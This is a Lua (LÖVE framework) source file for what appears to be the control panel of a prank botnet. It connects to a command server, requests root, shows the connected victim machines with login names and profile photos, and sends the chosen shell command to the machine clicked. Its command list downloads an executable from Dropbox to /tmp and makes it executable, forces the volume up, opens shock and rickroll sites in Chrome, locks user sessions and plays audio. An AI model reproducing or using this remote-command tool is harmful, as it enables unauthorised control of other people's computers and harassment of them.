

local socket = require "socket"
local json   = require "json"
local http = require("socket.http")

new = {}

function new._object(class, o)
   local o = o or {}
   setmetatable(o, { __index = class })
   return o
end

new._mt = {}
function new._mt.__index(table, key)
   local class = _G[key]
   return type(class.initialize) == 'function' and class.initialize or function() return new._object(class) end
end
setmetatable(new,new._mt)

---------------------------------

----------------------------------------------------------------

function loadImg(login)
    if not love.filesystem.exists(login..".jpg") then
        local b, c, h = http.request("https://cdn.42.fr/userprofil/profilview/"..login..".jpg")
        if c == 200 then
            love.filesystem.write(login..".jpg", b)
        else
            return false
        end
    end
    return true
end

avatar = {}

function drawPeople(v,x,y)
    love.graphics.draw( avatar[v.login], x, y)
    love.graphics.setColor( 0, 0, 0, 200)
    love.graphics.rectangle( 'fill', x, y, 160, 30)
    love.graphics.setColor( 255, 255, 255, 255)
    love.graphics.print(v.login,    x + 10, y + 2)
    love.graphics.print(v.hostname, x + 10, y + 15)
end

function drawList()
    id = 0
    for k,v in pairs(tab) do
        drawPeople(v, math.floor(id / 4) * 160, (id * 190) % (190*4))
        id = id + 1
    end
end

function love.load()

    host = "antoine.doussaud.org"
    port = 1234;

    tcpSocket = socket.tcp()
    tcpSocket:connect(host, port)
    tcpSocket:send("cmd:root\n")   -- get root
    print(tcpSocket:receive("*l")) -- is root
    tab = {}

    cmds = {
        "/tmp/audio -s 'Built-in Output'  && osascript -e 'set Volume 10' && '/Applications/Google Chrome.app/Contents/MacOS/Google Chrome' 'http://rickrolled.fr/'",
        "/tmp/audio -s 'Built-in Output'  && osascript -e 'set Volume 10' && '/Applications/Google Chrome.app/Contents/MacOS/Google Chrome' 'http://meatspin.fr/'",
        "'/System/Library/CoreServices/Menu Extras/User.menu/Contents/Resources/CGSession' -suspend",
        "osascript -e 'set Volume 10' && say Hello",
        "/tmp/audio -s 'Built-in Output'  && osascript -e 'set Volume 10' && afplay /tmp/darude.mp3 &",
        "/tmp/audio -s 'Built-in Output'  && osascript -e 'set Volume 10'",
        "curl -s 'https://dl.dropboxusercontent.com/u/22561204/AudioSwitcher' > /tmp/audio && chmod +x /tmp/audio",
        "curl -s 'http://instantsandstorm.com/sandstorm.mp3' > /tmp/darude.mp3",
        "echo echo"
        }

    cmds_name = {
        "rickroll",
        "meatspin",
        "delog",
        "say hello",
        "play darude",
        "hp",
        "dl audio",
        "dl darude",
        "echo"
    }

    mode = 0;
    r,g,b = 0,0, 255

end

i = 0

function love.update(dt)

    i = i + dt
    if (i > 2) then
        tcpSocket:send("cmd:client\n")
        data = tcpSocket:receive("*l")
        if data then
            if data:sub(0,7) == "jso:lst" then
                tab = json.decode(data:sub(9))
                for k,v in pairs(tab) do
                    if (not avatar[v.login]) then
                        if v.login and loadImg(v.login) then
                            avatar[v.login] = love.graphics.newImage(v.login..".jpg")
                        else
                            if not v.login then
                                v.login = "default"
                                v.hostname = " ? telnet ?"
                            end
                            avatar[v.login] = love.graphics.newImage("default.png")
                        end
                    end
                end
            else
                print(data)
            end
        end
        i = 0
    end

end

function love.draw()
    love.graphics.setColor( 255, 255, 255, 255)
    drawList()
    love.graphics.setColor( r, g, b, 255)
    love.graphics.rectangle( 'fill', 160 * 7, 190*3, 160, 190)
    love.graphics.setColor( 255, 255, 255, 255)
    love.graphics.print(mode % #cmds, 160 * 7 + 5, 190*3 + 5)
    love.graphics.print(cmds_name[mode % #cmds + 1], 160 * 7 + 5, 190*3 + 20)


end

function love.mousepressed(x, y, button)

    print(x,y,button)

    if x > (160*7) and y > (190*3) then
        mode = mode + 1
        mode = mode % #cmds
    else
        print(math.floor(x / 160)*4 +math.floor(y / 190))
        target = math.floor(x / 160)*4 +math.floor(y / 190);
        id = 0
        for k,v in pairs(tab) do
            if id == target then
                print("send:", v.ip, v.port, v.login)
                if button == 'l' then
    				tmp = {ip = v.ip, port = v.port, cmd = cmds[mode + 1]}
    			end
    			tcpSocket:send("cmd:run:"..json.encode(tmp).."\n")
            end
            id = id + 1
        end
    end
end
